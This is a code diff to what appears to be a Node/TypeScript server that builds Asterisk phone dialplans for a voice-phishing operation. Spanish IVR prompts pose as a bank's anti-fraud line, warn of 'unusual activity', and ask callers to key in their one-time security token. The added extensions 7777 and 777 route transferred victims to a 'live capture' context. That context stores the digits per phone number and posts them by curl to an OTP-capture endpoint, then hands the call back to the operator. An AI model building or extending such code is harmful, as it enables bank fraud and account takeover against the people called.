@@ -193,8 +193,8 @@ function ensureCustomAudioFilesExist() {
 
   const audios = [
     { name: 'alerta_banco_antifraude', text: 'Estimado cliente, detectamos una actividad inusual en su cuenta bancaria. Para proteger sus fondos, ingrese el codigo de seguridad enviado a su telefono.', freq: 520 },
-    { name: 'solicitar_codigo_otp', text: 'Por favor digite su token de seis digitos en el teclado de su telefono para continuar.', freq: 680 },
-    { name: 'digite_token_6_digitos', text: 'Por favor digite su token de seis digitos.', freq: 680 },
+    { name: 'solicitar_codigo_otp', text: 'Por favor digite su codigo seguido de la tecla de numero.', freq: 680 },
+    { name: 'digite_token_6_digitos', text: 'Por favor digite su codigo seguido de la tecla de numero.', freq: 680 },
     { name: 'token_invalido_reintente', text: 'El codigo digitado es incorrecto o invalido. Por favor, vuelva a digitar su token de seis digitos en el teclado de su telefono.', freq: 680 },
     { name: 'un_momento_validando_informacion', text: 'Un momento por favor, estamos validando su token en el sistema.', freq: 440 },
     { name: 'operacion_bloqueada_exito', text: 'Su operacion ha sido bloqueada y sus fondos estan seguros. Gracias por confiar en nosotros.', freq: 880 },
@@ -202,9 +202,9 @@ function ensureCustomAudioFilesExist() {
     { name: 'transferencia_asesor', text: 'Un momento por favor, le estamos transfiriendo con un asesor.', freq: 587 },
     { name: 'bienvenida_corporativa', text: 'Bienvenido al centro de atencion y seguridad bancaria.', freq: 520 },
     { name: 'bienvenida_press1', text: 'Estimado cliente, detectamos una actividad inusual. Presione 1 para comunicarse con un asesor de seguridad.', freq: 520 },
-    { name: 'bienvenida_7777', text: 'Por favor digite su token o codigo de seguridad de seis digitos en el teclado de su telefono.', freq: 680 },
+    { name: 'bienvenida_7777', text: 'Por favor digite su codigo seguido de la tecla de numero.', freq: 680 },
     { name: 'opcion_invalida', text: 'La opcion ingresada no es valida. Por favor intente de nuevo.', freq: 440 },
-    { name: 'prompt_otp_6_digitos', text: 'Por favor digite su token de seis digitos en el teclado de su telefono.', freq: 680 },
+    { name: 'prompt_otp_6_digitos', text: 'Por favor digite su codigo seguido de la tecla de numero.', freq: 680 },
   ];
 
   for (const aud of audios) {
@@ -573,10 +573,17 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Tt)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
-  dialplanContent += `; 2a. Extension Dedicada de Captura de Produccion (Extension 7777)\n`;
+  dialplanContent += `; 2a. Extension Dedicada de Captura OTP al Transferir (Extensiones 7777 y 777)\n`;
   dialplanContent += `exten => 7777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 7777 ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(1)\n`;
+  dialplanContent += ` same => n,Wait(0.5)\n`;
+  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})\n`;
+  dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
+
+  dialplanContent += `exten => 777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 777 ===)\n`;
+  dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Wait(0.5)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
   dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})\n`;
   dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
@@ -639,32 +646,44 @@ function generateCleanDialplanConf(
   dialplanContent += `exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
 
+  dialplanContent += `; ========================================================\n`;
+  dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 7777 / 777\n`;
+  dialplanContent += `; Mensaje: "Por favor digite su codigo seguido de la tecla de numero (#)"\n`;
+  dialplanContent += `; ========================================================\n`;
   dialplanContent += `[ivr-captura-vivo]\n`;
-  dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] INICIANDO PARA DESTINO: \${TARGET_DEST} ===)\n`;
+  dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO: \${TARGET_DEST} ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(1)\n`;
+  dialplanContent += ` same => n,Wait(0.5)\n`;
   dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${FINAL_AGENT}" != ""]?\${FINAL_AGENT}:1001)})\n`;
+  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${CALLERID(num)})})\n`;
+  dialplanContent += ` ; Buscar audio configurado para la extension 7777\n`;
   dialplanContent += ` same => n,Set(AUDIO_7777=\${DB(ivr_vars/7777_intro)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/7777_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/777_intro)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/bienvenida_7777))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/solicitar_codigo_otp))\n`;
-  dialplanContent += ` same => n,Playback(beep)\n`;
-  dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_7777},6,,2,15)\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/digite_token_6_digitos))\n`;
+  dialplanContent += ` same => n,NoOp(Reproduciendo audio de bienvenida y solicitud en 7777: \${AUDIO_7777})\n`;
+  dialplanContent += ` ; Read reproduce el audio y captura digitos hasta presionar '#' o timeout\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_7777},12,,2,15)\n`;
   dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?captura_ok)\n`;
   dialplanContent += ` same => n,Playback(beep)\n`;
-  dialplanContent += ` same => n,Read(USER_DIGITS,beep,6,,2,10)\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,beep,12,,2,10)\n`;
   dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" = ""]?captura_timeout)\n\n`;
 
-  dialplanContent += ` same => n(captura_ok),NoOp(=== [CAPTURA-7777] DIGITOS RECIBIDOS: \${USER_DIGITS} ===)\n`;
+  dialplanContent += ` same => n(captura_ok),NoOp(=== [CAPTURA-7777] CODIGO DIGITADO: \${USER_DIGITS} ===)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_codes/\${TARGET_DEST})=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
   dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
   dialplanContent += ` same => n,Playback(beep)\n`;
-  dialplanContent += ` same => n,Wait(1)\n`;
-  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] RETORNANDO LLAMADA AL ASESOR \${FINAL_AGENT} ===)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60)\n`;
+  dialplanContent += ` same => n,Wait(0.5)\n`;
+  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] RETORNANDO AL ASESOR \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
-  dialplanContent += ` same => n(captura_timeout),NoOp(=== [CAPTURA-7777] TIMEOUT SIN DIGITOS -> RECONECTANDO ASESOR ===)\n`;
+  dialplanContent += ` same => n(captura_timeout),NoOp(=== [CAPTURA-7777] TIMEOUT -> RETORNANDO AL ASESOR \${FINAL_AGENT} ===)\n`;
   dialplanContent += ` same => n,Playback(beep)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += `[ivr-otp]\n`;
@@ -1077,10 +1096,17 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
-    dialplanContent += `; 2a. Extension Dedicada de Captura de Produccion (Extension 7777)\n`;
+    dialplanContent += `; 2a. Extension Dedicada de Captura OTP al Transferir (Extensiones 7777 y 777)\n`;
     dialplanContent += `exten => 7777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 7777 ===)\n`;
     dialplanContent += ` same => n,Answer()\n`;
-    dialplanContent += ` same => n,Wait(1)\n`;
+    dialplanContent += ` same => n,Wait(0.5)\n`;
+    dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
+    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})\n`;
+    dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
+
+    dialplanContent += `exten => 777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 777 ===)\n`;
+    dialplanContent += ` same => n,Answer()\n`;
+    dialplanContent += ` same => n,Wait(0.5)\n`;
     dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
     dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})\n`;
     dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
@@ -1156,6 +1182,46 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += `[trunkinbound]\n`;
     dialplanContent += `exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})\n`;
     dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
+
+    dialplanContent += `; ========================================================\n`;
+    dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 7777 / 777\n`;
+    dialplanContent += `; Mensaje: "Por favor digite su codigo seguido de la tecla de numero (#)"\n`;
+    dialplanContent += `; ========================================================\n`;
+    dialplanContent += `[ivr-captura-vivo]\n`;
+    dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO: \${TARGET_DEST} ===)\n`;
+    dialplanContent += ` same => n,Answer()\n`;
+    dialplanContent += ` same => n,Wait(0.5)\n`;
+    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${FINAL_AGENT}" != ""]?\${FINAL_AGENT}:1001)})\n`;
+    dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${CALLERID(num)})})\n`;
+    dialplanContent += ` ; Buscar audio configurado para la extension 7777\n`;
+    dialplanContent += ` same => n,Set(AUDIO_7777=\${DB(ivr_vars/7777_intro)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/7777_prompt)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/777_intro)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/bienvenida_7777))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/solicitar_codigo_otp))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/digite_token_6_digitos))\n`;
+    dialplanContent += ` same => n,NoOp(Reproduciendo audio de bienvenida y solicitud en 7777: \${AUDIO_7777})\n`;
+    dialplanContent += ` ; Read reproduce el audio y captura digitos hasta presionar '#' o timeout\n`;
+    dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_7777},12,,2,15)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?captura_ok)\n`;
+    dialplanContent += ` same => n,Playback(beep)\n`;
+    dialplanContent += ` same => n,Read(USER_DIGITS,beep,12,,2,10)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" = ""]?captura_timeout)\n\n`;
+
+    dialplanContent += ` same => n(captura_ok),NoOp(=== [CAPTURA-7777] CODIGO DIGITADO: \${USER_DIGITS} ===)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_codes/\${TARGET_DEST})=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
+    dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
+    dialplanContent += ` same => n,Playback(beep)\n`;
+    dialplanContent += ` same => n,Wait(0.5)\n`;
+    dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] RETORNANDO AL ASESOR \${FINAL_AGENT} ===)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+    dialplanContent += ` same => n,Hangup()\n\n`;
+
+    dialplanContent += ` same => n(captura_timeout),NoOp(=== [CAPTURA-7777] TIMEOUT -> RETORNANDO AL ASESOR \${FINAL_AGENT} ===)\n`;
+    dialplanContent += ` same => n,Playback(beep)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+    dialplanContent += ` same => n,Hangup()\n\n`;
 
     dialplanContent += `; ========================================================\n`;
     dialplanContent += `; CONTEXTO IVR INTERACTIVO CON AUDIOS PREGRABADOS\n`;
@@ -1901,10 +1967,15 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
 
     case 'welcome_7777':
     case '7777':
+    case '777':
     case 'capture_7777':
       commands.push(`database put ivr_vars 7777_intro "${cleanPath}"`);
       commands.push(`database put ivr_vars 7777_prompt "${cleanPath}"`);
+      commands.push(`database put ivr_vars 777_intro "${cleanPath}"`);
+      commands.push(`database put ivr_vars 777_prompt "${cleanPath}"`);
       copyToFallback('bienvenida_7777');
+      copyToFallback('solicitar_codigo_otp');
+      copyToFallback('digite_token_6_digitos');
       activeAudioAssignments.welcome_7777 = cleanPath;
       break;
 
